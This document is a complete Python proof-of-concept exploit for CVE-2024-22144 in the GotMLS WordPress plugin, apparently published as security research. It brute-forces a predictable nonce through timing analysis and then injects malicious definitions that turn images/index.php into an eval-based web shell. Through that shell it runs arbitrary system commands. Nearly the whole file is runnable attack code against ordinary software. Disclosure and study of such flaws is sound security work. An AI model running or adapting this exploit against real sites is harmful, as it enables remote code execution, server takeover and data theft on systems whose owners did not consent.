"""
Remote Code Execution in GotMLS WordPress Plugin via multiple vulnerabilities including predictable nonce brute forcing.

Author: stealthcopter
Website: https://sec.stealthcopter.com/
GitHub: https://github.com/stealthcopter/gotmls-rce/
CVE-ID: CVE-2024-22144

Note that this proof-of-concept is designed to demonstrate the vulnerability against a localhost running WordPress
with the plugin installed. An attack against a remote host is likely to take longer to execute and may require
more fine-tuning. This attack can also likely be further optimised to reduce the size of the attack window by profiling
the HTTP requests and only attempting to brute force the nonce once we have a small enough window.
"""

import argparse
import concurrent.futures
import hashlib
import re
import threading
import time
import statistics
from base64 import urlsafe_b64encode, b64encode

import requests

HASHES_PER_REQUEST = 995  # Maximum number of hashes to send in each request (not this cannot surpase php max-vars)
WINDOW_SIZE_FACTOR = 1.1  # Adjust the window size by 10% to account for variability in request duration a increase chance of hitting a valid value
DEFAULT_THREAD_NO = 16    # It's a mix of md5 hashing and network requests, experimented and found 16 works best on my laptop

GOOD_STANDARD_DEVIATION_PERCENT = 0.06
HASH_DURATION_OFFSET_FUDGE_FACTOR = 5.15
WINDOW_SIZE_MATHS = 10_000_000

found_hash = threading.Event()
hashes_tested = 0
lock = threading.Lock()

proxies = {
    'http': 'http://127.0.0.1:8081',
    'https': 'http://127.0.0.1:8081'
}

def get_installation_key(site_url):
    return hashlib.md5(site_url.encode()).hexdigest()


def get_mt():
    """
    Obtains the value of microtime from the server, so we can synchronise times this makes brute forcing "fun" & "easy"!

    Note: Also Leaked here /wp-admin/admin-ajax.php?action=GOTMLS_logintime&UPDATE_definitions_array=2&GOTMLS_debug=GOTMLS_get_URL&mt=100
    """
    response = requests.get(f'{url}/wp-admin/admin-ajax.php?action=GOTMLS_log_session')

    # Regex to find mt parameter
    match = re.search(r"mt=([0-9]+\.[0-9]+)", response.text)

    if match:
        return float(match.group(1))


def get_nonce_from_nonces(nonces):
    """
    Once we've brute forced a nonce, we have 995 values, we can use this array with a single request to get a new
    valid nonce. Not strictly necessary but it is neater.
    """
    data = {
        "action": "GOTMLS_View_Quarantine",
        "GOTMLS_mt[]": nonces
    }

    response = requests.post(f'{url}/wp-admin/admin-ajax.php', data=data)
    # Regex to find mt parameter
    match = re.search(r"GOTMLS_mt=([0-9a-zA-Z]{32})", response.text)

    if match:
        return match.group(1)


def create_new_nonce(mt=None):
    nonce = '0' * 32
    url_nonce = f'{url}/wp-admin/admin-ajax.php?action=GOTMLS_load_update&UPDATE_definitions_array=2&GOTMLS_debug=GOTMLS_get_URL&GOTMLS_mt={nonce}'
    if mt:
        url_nonce += f'&mt={int(mt)}'
    response = requests.get(url_nonce)

    if verbose:
        print(response.text)
        print(response.status_code)

    if 'Nonce Error' in response.text:
        return True


def clear_nonces(mt):
    """
    Invalidates all existing nonces by setting the time to be 2 days ahead
    this will ensure we create a nonce rather than reuse an existing nonce
    as we need to be sure it was created at a predictable time.
    """
    return create_new_nonce(mt + 48 * 60 * 60)


def validate_nonce_server_key(nonces, server_key):
    data = {
        "action": "GOTMLS_lognewkey",
        "GOTMLS_installation_key": server_key
    }

    if (type(nonces) is list):
        data["GOTMLS_mt[]"] = nonces
    else:
        data["GOTMLS_mt"] = nonces

    response = requests.post(f'{url}/wp-admin/admin-ajax.php', data=data)
    if response.status_code == 200 and '~' in response.text:
        return True


def brute_force_hashes_multi(number, key, plugin_path, start_decimal, end_decimal):
    global hashes_tested
    global start_time
    """
    Single-thread: 501,480 hashes in 41.26 s (~12 kh/s)
    Multi-thread:  501,480 hashes in 7.61  s (~65 kh/s) 4 threads
    """

    hashes = []
    hashes_tested = 0
    start_time = time.time()

    for decimal in range(start_decimal, end_decimal):
        if found_hash.is_set():
            break

        no = number + "-" + str(decimal).ljust(9, '0')
        str_to_hash = no[4:7] + "/" + no[7:] + key + plugin_path

        hash = hashlib.md5(str_to_hash.encode()).hexdigest()
        hashes.append(hash)

        if len(hashes) == HASHES_PER_REQUEST:
            with lock:
                hashes_tested += len(hashes)
            if validate_nonce_server_key(hashes, key):
                with lock:
                    print(f"[-] Tested {hashes_tested:,} hashes over {hashes_tested / HASHES_PER_REQUEST:,.0f} requests (speed {speed:,.0f} h/s)")
                    print(f"[+] Found hash!!! (Tested: {hashes_tested:,} hashes)")
                    found_hash.set()
                    return hashes
            if found_hash.is_set():
                break
            speed = hashes_tested / (time.time() - start_time)
            print(f"[-] Tested {hashes_tested:,} hashes over {hashes_tested / HASHES_PER_REQUEST:,.0f} requests (speed {speed:,.0f} h/s)",
                  end="\r")
            hashes = []
    return False


def execute_brute_force_multi(mt, key, plugin_path, num_threads, window_size):
    number, decimal = str(mt).split(".")
    decimal = int(decimal) * 100
    chunk_size = window_size / num_threads
    # print(number, decimal, chunk_size)

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for i in range(num_threads):
            start_decimal = int(decimal + (i * chunk_size))
            end_decimal = int(decimal + ((i + 1) * chunk_size))
            if verbose:
                print(f"Thread {i} - {start_decimal} - {end_decimal}")
            futures.append(
                executor.submit(brute_force_hashes_multi, number, key, plugin_path, start_decimal, end_decimal))

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                return future.result()
    return False


def create_shell(nonce):
    """
    Injects new definitions that will cause selective removal of text form images/index.php that will result
    in RCE on the server by leaving behind an `eval($_REQUEST['mt']);`. Wow what a ride.
    """

    # Test if shell already exists:
    shell_response = execute_shell('echo beepbeep')
    if shell_response and 'beepbeep' in shell_response:
        print("[+] Shell already exists not recreating!")
        return True

    # This is a PHP object containing 3 regex's that are used to replace the contents of images/index.php that
    # remove 3 strings from the file leaving behind an `eval($_REQUEST["mt"]);` that we can use to execute arbitrary
    # commands.
    php_obj = 'a:1:{s:5:"known";a:3:{s:23:"stealthcopter testing 1";a:2:{i:0;s:5:"M4t01";i:1;s:18:"/\$bad = array\("/";}s:23:"stealthcopter testing 2";a:2:{i:0;s:5:"M4t02";i:1;s:27:"/", "preg_replace.*?isset/s";}s:23:"stealthcopter testing 3";a:2:{i:0;s:5:"M4t03";i:1;s:29:"/&&is_numeric\(.*?\\n\)(?=;)/s";}}}'

    data = {
        "action": "GOTMLS_load_update",
        "GOTMLS_mt": nonce,
        "UPDATE_definitions_array": urlsafe_b64encode(php_obj.encode()).decode().replace('=', '')
    }

    response = requests.post(f'{url}/wp-admin/admin-ajax.php', data=data)

    if verbose:
        print(response.text)
        print(response.status_code)

    filename = f'{plugin_path}images/index.php'
    base64_filename = urlsafe_b64encode(filename.encode()).decode().replace("=", "")

    base64_filename_mangled = b64encode(filename.encode()).decode() + "="
    count = base64_filename_mangled.count("=")
    base64_filename_mangled = base64_filename_mangled.replace('=', '')
    base64_filename_mangled = base64_filename_mangled.replace('0', '=')
    base64_filename_mangled = base64_filename_mangled + str(count)

    data = {
        "action": "GOTMLS_scan",
        "GOTMLS_mt": nonce,
        "GOTMLS_fix[]": base64_filename_mangled
    }

    response = requests.post(f'{url}/wp-admin/admin-ajax.php?GOTMLS_only_file=aaa&GOTMLS_scan={base64_filename}',
                             data=data)

    if verbose:
        print(response.text)
        print(response.status_code)

    if 'Potential threats in file' in response.text:
        time.sleep(3)
        return True


def execute_shell(command):
    data = {
        "mt": f"die(system('{command}'));"
    }
    url_shell = f'{url}/wp-content/plugins/gotmls/images/index.php'
    if verbose:
        print(f" ├ URL {url_shell}")
        print(" ├ Posting data to the above URL will also work!")
    response = requests.post(url_shell, data=data)
    if not response.text.startswith('GIF89a'):
        return response.text


def calculate_offset():
    offsets = []
    round_trips = []
    for _ in range(5):
        t1 = time.time()
        mt = get_mt()
        t2 = time.time()

        offsets.append(mt - t1)
        round_trips.append(t2 - t1)

    average_offset = sum(offsets) / len(offsets)
    average_rtt = sum(round_trips) / len(round_trips)

    print(f" ├ Offset time:     {average_offset:.5f} ms (min:{min(offsets):.5f} max:{max(offsets):.5f})")
    print(f" └ Round trip time: {average_rtt:.5f} ms (min:{min(round_trips):.5f} max:{max(round_trips):.5f})")

    return average_offset, average_rtt


def inject_nonces(mt):
    """
    Injects   1 nonce  in 0.13977289199829102s = 0.13s / nonce
    Injects ~25 nonces in 2s                   = 0.08s / nonce

    This gives an approximate search area of 0.08s.
    Given we need to brute force a nanosecond at a time this is ~80,000,000 hashes
    We can send ~995 hashes in each request, meaning we need to send around 80,402 request

    Note: It should be possible to further optimise this function by inserting all the nonces as fast as possible
    by using multi-threading. The order must be maintained otherwise out of order mt's will invalidate previous nonces.
    I tried doing this in Python but was unsuccessful in making it better than 25 nonces in 2s.
    """

    mt_normalized = int(mt - (mt % 3600))
    for i in [int(mt_normalized + (i * 3600)) for i in range(0, 25)]:
        # print(f"Creating nonce {i} {int(i / 60 / 60)}")
        create_new_nonce(i)

    return True

def brute_force_large_window(key, no_threads):
    print(f'[+] Starting attack:')
    mt = get_mt()
    print(f' ├ Server Microtime: {mt}')
    print(f' ├ Clearing Existing Nonces')
    clear_nonces(round(mt))

    t1 = time.time()
    if not inject_nonces(mt):
        print('    └ [!] Error: Could not generate new nonces')
        return False

    t2 = time.time()
    time_mid = (t2 + t1) / 2
    average_request_time = (t2 - t1) / 25

    print(f' ├ Start time: {t1}')
    print(f' ├ Midpoint:   {time_mid}')
    print(f' ├ End time:   {t2}')
    print(f' └ 25 Nonces Injected in {t2 - t1:.5f} s (avg {average_request_time:.6f})')

    hashes_needed = int(average_request_time * WINDOW_SIZE_FACTOR * 1_000_000_000)
    probable_requests = int(hashes_needed / HASHES_PER_REQUEST)
    print('[?] Attack feasibility calculation')
    print(f' ├ These values are the maximum search space, average attack should take 50% of these')
    print(f' ├ Hashes: {hashes_needed:,}')
    print(f' ├ Requests: {probable_requests:,}')
    print(f' └ Estimated Time: {probable_requests * average_request_time:,.0f}s')

    input("[*] Press enter to continue or ctrl+c to stop")

    hashes = execute_brute_force_multi(time_mid, key, plugin_path, no_threads, hashes_needed)
    return hashes


def brute_force_using_maths(key, no_threads):
    print('[+] Using the power of maths to brute force a valid nonce')

    while True:
        mt = get_mt()
        clear_nonces(mt)
        mt_normalized = int(mt - (mt % 3600))
        new_mt = mt_normalized + 3600

        time1 = time.time()
        mt1 = get_mt()
        time2 = time.time()
        create_new_nonce(new_mt)
        time3 = time.time()
        mt2 = get_mt()
        time4 = time.time()

        if verbose:
            print(f' ├ Server Microtime 1: {mt1}')
            print(f' ├ Server Microtime 2: {mt2}')
            print(f' ├ Request Trip Time 1: {time2 - time1}')
            print(f' ├ Request Trip Time 2: {time3 - time2}')
            print(f' ├ Request Trip Time 3: {time4 - time3}')

        times = [time2 - time1, time3 - time2, time4 - time3]
        std_dev = statistics.stdev(times)
        mean = statistics.mean(times)
        print(f" ├ Standard Deviation: {std_dev} {std_dev / mean}")

        if std_dev / mean > GOOD_STANDARD_DEVIATION_PERCENT:
            print(" └ [!] Warning standard deviation above threshold, waiting...")
            continue

        guess2 = mt2 - (time3 - time2) / HASH_DURATION_OFFSET_FUDGE_FACTOR

        print(f' ├ Estimated nonce creation time: {guess2} (MATHS!!!)')
        break

    window_size = WINDOW_SIZE_MATHS
    start_no = guess2 - (window_size / 2) * 1e-9
    end_no = guess2 + (window_size / 2) * 1e-9

    print(f' ├ Window: {start_no} - {end_no} (size {window_size:,})')

    return execute_brute_force_multi(start_no, key, plugin_path, no_threads, window_size)


def exploit(nonce=None, command='id', no_threads=DEFAULT_THREAD_NO, method='maths'):
    print(f'[+] Exploiting Host: {url}')

    key = get_installation_key(url)

    if not nonce:
        print(f'[+] Calculated Installation Key: {key}')
        print(f'[+] Using Plugin Path: {plugin_path}')

        print(f'[+] Calibrating timing attack:')
        average_offset, average_rtt = calculate_offset()

        if not average_offset or not average_rtt:
            print('[!] Error: Could not calculate times')
            return False

        if average_offset > 0.1:
            print('[?] Warning: Time offset from server seems high, time needs to be synced')
            input("[*] Press enter to continue or ctrl+c to stop")

        t1 = time.time()
        if method == 'maths':
            hashes = brute_force_using_maths(key, no_threads)
        else:
            hashes = brute_force_large_window(key, no_threads)

        if not hashes:
            print("[!] Exhausted search space, maybe we just got unlucky or maybe the search area needs expanding?")
            print(" └  Try running the script again...")
            return False

        print(f" └ Brute forced a valid nonce in {time.time() - t1:.2f}s")

        # Give a chance to threads to finish
        time.sleep(3)

        nonce = get_nonce_from_nonces(hashes)
        if not nonce:
            print(f" ├ [!] Could not obtain single nonce from list of nonces")
            print(f" └ [!] Dumping the entire list so our brute force wasn't wasted:")
            print(str(hashes))
            return False

        print(f" └ Converted {HASHES_PER_REQUEST} hashes into single nonce {nonce}")
    else:
        print(f"[+] Nonce provided {nonce}, resuming attack")

    if not nonce:
        return False

    if not validate_nonce_server_key(nonce, key):
        print("[!] Error: Could not verify nonce and server key")
        return False

    print("[+] Validated nonce and server key")

    print("[!] Injecting a shell into images/index.php is a destructive process")
    input("[*] Press any key to continue or ctrl+c to quit")

    print("[+] Injecting malicious update")
    if not create_shell(nonce):
        print(f" └ Doesn't look like we wrote a shell, will attempt to execute anyway...")

    if verbose:
        print(
            "[*] Note the images/index.php file is now slightly broken. You may want to fix it.")

    # Sleep needed so file write is complete finished
    time.sleep(3)

    print(f"[+] Executing shell with: {command}")
    if response := execute_shell('id'):
        print(f" └ {response}")
    else:
        print(f" └ [!] Failed to execute command")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Remote code execution in GotMLS WordPress Plugin via predictable nonce brute forcing.")

    parser.add_argument("url",
                        help="The target URL eg (http://localhost:8080), note this neds to match what the WordPress Site URL.")
    parser.add_argument("-n", "--nonce", help="Nonce to use if you already have one. Useful for resuming an attack.",
                        default=None)
    parser.add_argument("-t", "--threads", type=int, help="Number of threads to use", default=DEFAULT_THREAD_NO)
    parser.add_argument("-c", "--command", help="Command to execute", default='id')
    parser.add_argument("-m", "--method", help="Method of brute force attack. Maths should be faster but works better against local/fast network conncetions. Large will be more reliable but slower.", default='maths', choices=['maths', 'large'])
    parser.add_argument("-p", "--path", help="The WordPress installation path. Note the trailing slash is very important!",
                        default='/var/www/html/wp-content/plugins/gotmls/')
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode", default=False)

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    global url, verbose, plugin_path
    url = args.url
    verbose = args.verbose
    plugin_path = args.path

    exploit(args.nonce, args.command, args.threads, args.method)
